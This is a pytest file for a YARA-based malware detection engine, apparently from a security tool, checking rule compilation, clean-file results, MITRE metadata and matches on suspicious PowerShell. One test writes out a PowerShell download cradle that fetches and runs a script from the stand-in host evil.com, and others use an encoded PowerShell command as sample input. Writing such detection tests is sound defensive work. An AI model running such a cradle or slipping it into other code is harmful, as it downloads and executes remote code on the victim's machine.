"""Tests for YARA engine — rule compilation and file scanning."""

import tempfile
from pathlib import Path

import pytest

from services.yara_engine import get_rule_count, initialize, match, match_data


class TestYaraEngine:
    def test_rules_compiled(self):
        initialize()
        assert get_rule_count() > 0

    def test_clean_file_no_match(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
            f.write("Hello World, this is a clean text file.")
            path = f.name
        results = match(path)
        Path(path).unlink()
        assert results == []

    def test_powershell_encoded_match(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".ps1", delete=False, encoding="utf-8") as f:
            f.write("powershell.exe -enc SGVsbG8gV29ybGQgVGhpcyBpcyBhIHRlc3Q=")
            path = f.name
        results = match(path)
        Path(path).unlink()
        assert len(results) > 0
        rule_names = [r["rule"] for r in results]
        assert "powershell_encoded_command" in rule_names

    def test_download_cradle_match(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".ps1", delete=False, encoding="utf-8") as f:
            f.write('IEX(New-Object Net.WebClient).DownloadString("http://evil.com/a.ps1")')
            path = f.name
        results = match(path)
        Path(path).unlink()
        rule_names = [r["rule"] for r in results]
        assert "powershell_download_cradle" in rule_names

    def test_mitre_metadata_present(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".ps1", delete=False, encoding="utf-8") as f:
            f.write("powershell.exe -enc SGVsbG8gV29ybGQgVGhpcyBpcyBhIHRlc3Q=")
            path = f.name
        results = match(path)
        Path(path).unlink()
        for r in results:
            assert "mitre" in r["meta"]
            assert r["meta"]["mitre"].startswith("T")

    def test_nonexistent_file_returns_empty(self):
        results = match("C:\\nonexistent\\file.xyz")
        assert results == []

    def test_match_data_bytes(self):
        data = b"powershell.exe -enc SGVsbG8gV29ybGQgVGhpcyBpcyBhIHRlc3Q="
        results = match_data(data)
        assert len(results) > 0
